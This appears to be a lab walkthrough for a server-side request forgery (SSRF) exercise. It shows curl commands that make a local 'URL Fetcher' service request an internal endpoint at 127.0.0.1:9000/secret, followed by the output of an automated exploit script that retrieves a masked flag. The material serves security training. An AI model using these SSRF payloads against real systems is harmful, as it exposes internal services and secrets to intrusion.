# Walkthrough: SSRF

## Setup

```bash
docker compose up --build -d
curl http://localhost:8083/
```

Output:
```json
{
  "service": "URL Fetcher v1.0",
  "note": "Fetches URLs on behalf of the user",
  "endpoint": "GET /fetch?url=<url>",
  "example": "GET /fetch?url=http://example.com"
}
```

## Step 1: Confirm the Fetch Endpoint Works

```bash
curl "http://localhost:8083/fetch?url=http://127.0.0.1:9000/"
```

Output:
```json
{
  "url": "http://127.0.0.1:9000/",
  "body": "{\"error\": \"not found\"}"
}
```

The server made a request to `127.0.0.1:9000`. The internal service exists and responded.

## Step 2: Discover the Secret Endpoint

The metadata service has a `/secret` path. Supply it:

```bash
curl "http://localhost:8083/fetch?url=http://127.0.0.1:9000/secret"
```

Output:
```json
{
  "url": "http://127.0.0.1:9000/secret",
  "body": "{\"flag\": \"POC{...}\"}"
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8083
```

Output:
```
[*] Target: http://localhost:8083

[*] Testing normal fetch...
[*] Internal server root: {"error": "not found"}

[*] SSRF payload: http://127.0.0.1:9000/secret
[*] Response body: {"flag": "POC{...}"}

[+] Flag: POC{...}
```
